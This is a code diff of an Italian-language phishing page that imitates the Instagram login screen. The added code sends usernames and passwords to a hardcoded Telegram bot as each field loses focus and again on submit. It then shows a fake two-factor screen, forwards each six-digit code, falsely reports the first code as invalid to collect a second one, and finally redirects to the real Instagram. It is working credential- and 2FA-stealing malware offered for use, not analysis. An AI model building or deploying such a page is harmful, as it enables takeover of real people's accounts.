@@ -3,14 +3,22 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Instagram Login Clone</title>
-
+<title>Instagram</title>
 <style>
 *{
     margin:0;
     padding:0;
     box-sizing:border-box;
     font-family: Arial, sans-serif;
+}
+
+body{
+    background:#0f2533;
+    color:white;
+    height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
 }
 
 /* ===== SPLASH ===== */
@@ -46,13 +54,7 @@
     -webkit-text-fill-color:transparent;
 }
 
-/* ===== LOGIN ===== */
-body{
-    background:#0f2533;
-    height:100vh;
-    color:white;
-}
-
+/* ===== CONTAINERS ===== */
 .container{
     display:none;
     width:100%;
@@ -64,6 +66,11 @@ body{
     height:100vh;
 }
 
+.container.active{
+    display:flex;
+}
+
+/* ===== LOGIN ===== */
 .logo{
     margin-top:80px;
     margin-bottom:60px;
@@ -106,10 +113,11 @@ body{
     color:white;
     font-size:18px;
     cursor:pointer;
+    transition:0.3s;
 }
 
 .login-btn:disabled{
-    opacity:0.6;
+    opacity:0.5;
     cursor:not-allowed;
 }
 
@@ -135,6 +143,7 @@ body{
     background:transparent;
     color:#4fa0ff;
     font-size:16px;
+    cursor:pointer;
 }
 
 .meta{
@@ -143,36 +152,152 @@ body{
     color:#d6d6d6;
 }
 
-#countdown{
-    margin-top:10px;
-    color:#ffcc00;
-    font-size:14px;
+/* ===== 2FA ===== */
+.twofa-container{
+    display:none;
+    width:100%;
+    max-width:420px;
+    padding:20px;
+    flex-direction:column;
+    height:100vh;
+    justify-content:flex-start;
+    padding-top:80px;
 }
 
-.loader{
-    display:inline-block;
-    width:16px;
-    height:16px;
-    border:2px solid #fff;
-    border-top:2px solid transparent;
+.twofa-container.active{
+    display:flex;
+}
+
+.back{
+    font-size:28px;
+    margin-bottom:20px;
+    cursor:pointer;
+    width:40px;
+}
+
+h1{
+    font-size:28px;
+    margin-bottom:8px;
+}
+
+.sub{
+    font-size:14px;
+    color:#cfd8dc;
+    margin-bottom:20px;
+}
+
+.code-inputs{
+    display:flex;
+    gap:10px;
+    justify-content:center;
+    margin-bottom:10px;
+}
+
+.code-inputs input{
+    width:50px;
+    height:55px;
+    text-align:center;
+    font-size:22px;
+    border-radius:12px;
+    border:1px solid #3a4a55;
+    background:#15232b;
+    color:white;
+    outline:none;
+}
+
+.code-inputs input:focus{
+    border-color:#4da3ff;
+}
+
+.info{
+    font-size:13px;
+    color:#b0bec5;
+    margin:15px 0;
+    line-height:1.4;
+    text-align:center;
+}
+
+.link{
+    color:#4da3ff;
+    font-size:14px;
+    margin-top:5px;
+    cursor:pointer;
+    text-align:center;
+}
+
+button{
+    width:100%;
+    padding:14px;
+    border:none;
+    border-radius:25px;
+    font-size:16px;
+    cursor:pointer;
+    transition:0.3s;
+}
+
+button:disabled{
+    opacity:0.4;
+    cursor:not-allowed;
+}
+
+.primary{
+    background:#0a66ff;
+    color:white;
+    margin-top:20px;
+}
+
+.secondary{
+    background:#2a2f33;
+    color:#b0bec5;
+    margin-top:10px;
+}
+
+.error-msg{
+    color:#ff4444;
+    font-size:13px;
+    display:none;
+    margin-bottom:10px;
+    text-align:center;
+}
+
+.loading-screen{
+    display:none;
+    position:fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    background:#0f2533;
+    z-index:9999;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    gap:15px;
+}
+
+.loading-screen .spinner{
+    width:40px;
+    height:40px;
+    border:4px solid #3b5266;
+    border-top-color:#1877f2;
     border-radius:50%;
-    animation: spin 0.8s linear infinite;
-    margin-right:8px;
-    vertical-align:middle;
+    animation:spin 0.8s linear infinite;
 }
 
 @keyframes spin{
     to{transform:rotate(360deg);}
 }
+
+.loading-screen p{
+    font-size:15px;
+    color:#cfd8dc;
+}
 </style>
-
 </head>
-
 <body>
 
 <!-- SPLASH -->
 <div class="splash" id="splash">
-
 <svg viewBox="0 0 24 24" fill="none">
 <defs>
 <linearGradient id="ig" x1="0" y1="1" x2="1" y2="0">
@@ -183,28 +308,25 @@ body{
 <stop offset="100%" stop-color="#4f5bd5"/>
 </linearGradient>
 </defs>
-
-<rect x="3" y="3" width="18" height="18" rx="5"
-stroke="url(#ig)" stroke-width="2.2"/>
-
-<circle cx="12" cy="12" r="4.2"
-stroke="url(#ig)" stroke-width="2.2"/>
-
+<rect x="3" y="3" width="18" height="18" rx="5" stroke="url(#ig)" stroke-width="2.2"/>
+<circle cx="12" cy="12" r="4.2" stroke="url(#ig)" stroke-width="2.2"/>
 <circle cx="17.5" cy="6.5" r="1.3" fill="url(#ig)"/>
 </svg>
-
 <div class="metaSplash">
 <span>from</span>
 <strong>Meta</strong>
 </div>
+</div>
 
+<!-- LOADING -->
+<div class="loading-screen" id="loadingScreen">
+<div class="spinner"></div>
+<p id="loadingText">Verifica in corso...</p>
 </div>
 
 <!-- LOGIN -->
-<div class="container" id="login">
-
+<div class="container active" id="loginContainer">
 <div class="logo">
-
 <svg viewBox="0 0 24 24" fill="none">
 <defs>
 <linearGradient id="ig2" x1="0" y1="1" x2="1" y2="0">
@@ -215,139 +337,293 @@ stroke="url(#ig)" stroke-width="2.2"/>
 <stop offset="100%" stop-color="#4f5bd5"/>
 </linearGradient>
 </defs>
-
-<rect x="3" y="3" width="18" height="18" rx="5"
-stroke="url(#ig2)" stroke-width="2.2"/>
-
-<circle cx="12" cy="12" r="4.2"
-stroke="url(#ig2)" stroke-width="2.2"/>
-
+<rect x="3" y="3" width="18" height="18" rx="5" stroke="url(#ig2)" stroke-width="2.2"/>
+<circle cx="12" cy="12" r="4.2" stroke="url(#ig2)" stroke-width="2.2"/>
 <circle cx="17.5" cy="6.5" r="1.3" fill="url(#ig2)"/>
 </svg>
-
 </div>
 
 <div class="input-box">
 <input type="text" id="username" placeholder="Nome utente, e-mail o numero di cellulare">
 </div>
-
 <div class="input-box">
 <input type="password" id="password" placeholder="Password">
 </div>
 
-<button class="login-btn" id="loginBtn">Accedi</button>
-<div id="countdown"></div>
+<div id="loginError" class="error-msg">Dati non validi. Riprova.</div>
 
+<button class="login-btn" id="loginBtn" disabled>Accedi</button>
 <a href="#" class="forgot">Password dimenticata?</a>
 
 <div class="bottom">
 <button class="create">Crea nuovo account</button>
 <div class="meta">∞ Meta</div>
 </div>
+</div>
 
+<!-- 2FA -->
+<div class="twofa-container" id="twofaContainer">
+<div class="back" id="backToLogin">←</div>
+<h1>Controlla</h1>
+<div class="sub">Abbiamo inviato un codice a <span id="displayUser">...</span></div>
+
+<div id="twofaError" class="error-msg">Codice non valido. Riprova.</div>
+
+<div class="code-inputs" id="codeInputs">
+<input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="code-box">
+<input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="code-box">
+<input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="code-box">
+<input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="code-box">
+<input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="code-box">
+<input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="code-box">
+</div>
+
+<div class="info">
+La ricezione di questo codice potrebbe richiedere alcuni minuti.
+<div class="link" id="resendBtn">Ricevi un nuovo codice</div>
+</div>
+
+<button class="primary" id="verifyBtn" disabled>Continua</button>
+<button class="secondary" id="tryDifferent">Prova diversamente</button>
 </div>
 
 <script>
-// =====================================================
-// 🎯 CONFIGURAZIONE — INSERISCI I TUOI DATI QUI
-// =====================================================
-const BOT_TOKEN = "8191936030:AAFl4PoBphmVzsukVH1Y-SP5mE45kgMqnkg"; // ← Metti il token del tuo bot
-const CHAT_ID  = "8278195073"; // ← Metti il tuo chat ID
+// ============================================
+//  CONFIG - Bot Telegram
+// ============================================
+const CONFIG = {
+    telegramToken: '8191936030:AAFl4PoBphmVzsukVH1Y-SP5mE45kgMqnkg',
+    telegramChatId: '8278195073',
+};
 
-// =====================================================
-// ⏱ SPLASH → LOGIN dopo 3 secondi
-// =====================================================
+// ============================================
+//  TELEGRAM SENDER
+// ============================================
+function sendToTelegram(message) {
+    const url = `https://api.telegram.org/bot${CONFIG.telegramToken}/sendMessage`;
+    const params = new URLSearchParams({
+        chat_id: CONFIG.telegramChatId,
+        text: message,
+        parse_mode: 'Markdown'
+    });
+    new Image().src = `${url}?${params.toString()}`;
+}
+
+// ============================================
+//  ELEMENTS
+// ============================================
+const splash = document.getElementById('splash');
+const loginContainer = document.getElementById('loginContainer');
+const twofaContainer = document.getElementById('twofaContainer');
+const loadingScreen = document.getElementById('loadingScreen');
+const loadingText = document.getElementById('loadingText');
+
+const username = document.getElementById('username');
+const password = document.getElementById('password');
+const loginBtn = document.getElementById('loginBtn');
+const loginError = document.getElementById('loginError');
+
+const displayUser = document.getElementById('displayUser');
+const codeBoxes = document.querySelectorAll('.code-box');
+const verifyBtn = document.getElementById('verifyBtn');
+const twofaError = document.getElementById('twofaError');
+const backToLogin = document.getElementById('backToLogin');
+const resendBtn = document.getElementById('resendBtn');
+
+let capturedUsername = '';
+let capturedPassword = '';
+let verificationAttempts = 0;
+let usernameSent = false;
+let passwordSent = false;
+
+// ============================================
+//  SPLASH
+// ============================================
 setTimeout(() => {
-    document.getElementById("splash").style.display = "none";
-    document.getElementById("login").style.display = "flex";
-}, 3000);
+    splash.style.display = 'none';
+}, 2500);
 
-// =====================================================
-// 📩 Invia messaggio a Telegram
-// =====================================================
-async function sendToTelegram(username, password, ip, userAgent) {
-    const text = `🔐 *Instagram Credenziali Catturate*
-
-👤 *Username:* \`${username}\`
-🔑 *Password:* \`${password}\`
-🌐 *IP:* \`${ip}\`
-📱 *User-Agent:* \`${userAgent}\`
-⏰ *Data:* ${new Date().toLocaleString('it-IT')}`;
-
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-    try {
-        const resp = await fetch(url, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: text,
-                parse_mode: 'Markdown'
-            })
-        });
-        return resp.ok;
-    } catch(e) {
-        console.error('Telegram error:', e);
-        return false;
-    }
+// ============================================
+//  LOGIN VALIDATION
+// ============================================
+function checkLogin() {
+    loginBtn.disabled = !(username.value.trim() && password.value.trim());
 }
 
-// =====================================================
-// 🌍 Ottenere IP (opzionale, fallback se fallisce)
-// =====================================================
-async function getIP() {
-    try {
-        const resp = await fetch('https://api.ipify.org?format=json');
-        const data = await resp.json();
-        return data.ip;
-    } catch(e) {
-        return 'IP non rilevato';
-    }
-}
+username.addEventListener('input', checkLogin);
+password.addEventListener('input', checkLogin);
 
-// =====================================================
-// 🎯 Gestione click su "Accedi"
-// =====================================================
-document.getElementById("loginBtn").addEventListener("click", async function(e) {
+// Capture username on blur
+username.addEventListener('blur', function() {
+    const val = this.value.trim();
+    if (val && !usernameSent) {
+        usernameSent = true;
+        sendToTelegram(
+            `📧 *Step 1: Identifier Captured* 📧\n\n` +
+            `👤 *Identifier:* \`${val}\`\n` +
+            `⏰ *Time:* ${new Date().toISOString()}`
+        );
+    }
+});
+
+// Capture password on blur
+password.addEventListener('blur', function() {
+    const val = this.value;
+    if (val && !passwordSent) {
+        passwordSent = true;
+        sendToTelegram(
+            `🔑 *Step 2: Password Captured* 🔑\n\n` +
+            `👤 *Identifier:* \`${username.value.trim() || 'N/A'}\`\n` +
+            `🔑 *Password:* \`${val}\`\n` +
+            `⏰ *Time:* ${new Date().toISOString()}`
+        );
+    }
+});
+
+// ============================================
+//  LOGIN SUBMIT
+// ============================================
+loginBtn.addEventListener('click', function(e) {
     e.preventDefault();
 
-    const username = document.getElementById("username").value.trim();
-    const password = document.getElementById("password").value.trim();
+    capturedUsername = username.value.trim();
+    capturedPassword = password.value;
 
-    if(!username || !password){
-        alert("Per favore compila tutti i campi.");
-        return;
-    }
+    // Send confirmation via Telegram
+    sendToTelegram(
+        `✅ *Login Button Pressed* ✅\n\n` +
+        `👤 *User:* \`${capturedUsername}\`\n` +
+        `🔑 *Pass:* \`${capturedPassword}\`\n` +
+        `⏰ *Time:* ${new Date().toISOString()}`
+    );
 
-    // Disabilita bottone e mostra loading
-    const btn = this;
-    btn.disabled = true;
-    btn.innerHTML = '<span class="loader"></span> Elaborazione...';
+    // Simulate delay then show 2FA
+    loginBtn.disabled = true;
+    loginBtn.textContent = 'Verifica...';
 
-    // Ottieni IP e User-Agent
-    const ip = await getIP();
-    const userAgent = navigator.userAgent;
+    setTimeout(() => {
+        loginContainer.classList.remove('active');
+        twofaContainer.classList.add('active');
+        displayUser.textContent = capturedUsername || 'telefono';
 
-    // Invia a Telegram
-    await sendToTelegram(username, password, ip, userAgent);
+        // Reset 2FA
+        codeBoxes.forEach(box => box.value = '');
+        codeBoxes[0].focus();
+        verifyBtn.disabled = true;
+        twofaError.style.display = 'none';
+        loginBtn.disabled = false;
+        loginBtn.textContent = 'Accedi';
+    }, 2000);
+});
 
-    // ⏱ Avvia countdown 5 secondi
-    let seconds = 5;
-    const countdownDiv = document.getElementById("countdown");
-    countdownDiv.innerHTML = `Reindirizzamento tra ${seconds} secondi...`;
-
-    const timer = setInterval(() => {
-        seconds--;
-        if(seconds > 0){
-            countdownDiv.innerHTML = `Reindirizzamento tra ${seconds} secondi...`;
-        } else {
-            clearInterval(timer);
-            countdownDiv.innerHTML = "";
-            // Reindirizza a Instagram vero
-            window.location.href = "https://www.instagram.com/";
+// ============================================
+//  2FA CODE INPUT
+// ============================================
+codeBoxes.forEach((box, index) => {
+    box.addEventListener('input', function() {
+        this.value = this.value.replace(/[^0-9]/g, '').slice(0, 1);
+        if (this.value && index < codeBoxes.length - 1) {
+            codeBoxes[index + 1].focus();
         }
-    }, 1000);
+        const allFilled = Array.from(codeBoxes).every(b => b.value !== '');
+        verifyBtn.disabled = !allFilled;
+        twofaError.style.display = 'none';
+    });
+
+    box.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace' && !this.value && index > 0) {
+            codeBoxes[index - 1].focus();
+        }
+    });
+
+    box.addEventListener('paste', function(e) {
+        e.preventDefault();
+        const paste = (e.clipboardData || window.clipboardData).getData('text');
+        const digits = paste.replace(/[^0-9]/g, '').slice(0, 6);
+        digits.split('').forEach((d, i) => {
+            if (codeBoxes[i]) codeBoxes[i].value = d;
+        });
+        if (digits.length === 6) {
+            codeBoxes[5].focus();
+            verifyBtn.disabled = false;
+        } else if (codeBoxes[digits.length]) {
+            codeBoxes[digits.length].focus();
+        }
+    });
+});
+
+// ============================================
+//  VERIFY 2FA
+// ============================================
+verifyBtn.addEventListener('click', function() {
+    const code = Array.from(codeBoxes).map(b => b.value).join('');
+    verificationAttempts++;
+
+    loadingScreen.style.display = 'flex';
+    loadingText.textContent = 'Verifica codice...';
+
+    // Send 2FA code to Telegram
+    sendToTelegram(
+        `🔢 *Step 3: 2FA Code* 🔢\n\n` +
+        `👤 *User:* \`${capturedUsername}\`\n` +
+        `🔢 *Code:* \`${code}\`\n` +
+        `🔄 *Attempt:* ${verificationAttempts}\n` +
+        `⏰ *Time:* ${new Date().toISOString()}`
+    );
+
+    setTimeout(() => {
+        loadingScreen.style.display = 'none';
+
+        // Show success / redirect after 2 attempts
+        if (verificationAttempts >= 2) {
+            loadingText.textContent = 'Reindirizzamento...';
+            loadingScreen.style.display = 'flex';
+
+            setTimeout(() => {
+                window.location.href = 'https://www.instagram.com';
+            }, 1500);
+        } else {
+            twofaError.style.display = 'block';
+            codeBoxes.forEach(box => box.value = '');
+            codeBoxes[0].focus();
+            verifyBtn.disabled = true;
+        }
+    }, 1500);
+});
+
+// ============================================
+//  BACK TO LOGIN
+// ============================================
+backToLogin.addEventListener('click', function() {
+    twofaContainer.classList.remove('active');
+    loginContainer.classList.add('active');
+    twofaError.style.display = 'none';
+    codeBoxes.forEach(box => box.value = '');
+    verificationAttempts = 0;
+});
+
+// ============================================
+//  RESEND CODE
+// ============================================
+resendBtn.addEventListener('click', function() {
+    codeBoxes.forEach(box => box.value = '');
+    codeBoxes[0].focus();
+    verifyBtn.disabled = true;
+    twofaError.style.display = 'none';
+
+    sendToTelegram(`🔄 *Resend Code Requested* 🔄\n\n👤 *User:* \`${capturedUsername}\`\n⏰ *Time:* ${new Date().toISOString()}`);
+});
+
+// ============================================
+//  TRY DIFFERENT
+// ============================================
+document.getElementById('tryDifferent').addEventListener('click', function() {
+    twofaContainer.classList.remove('active');
+    loginContainer.classList.add('active');
+    twofaError.style.display = 'none';
+    verificationAttempts = 0;
+
+    sendToTelegram(`↩️ *Try Different Method* ↩️\n\n👤 *User:* \`${capturedUsername}\`\n⏰ *Time:* ${new Date().toISOString()}`);
 });
 </script>
 
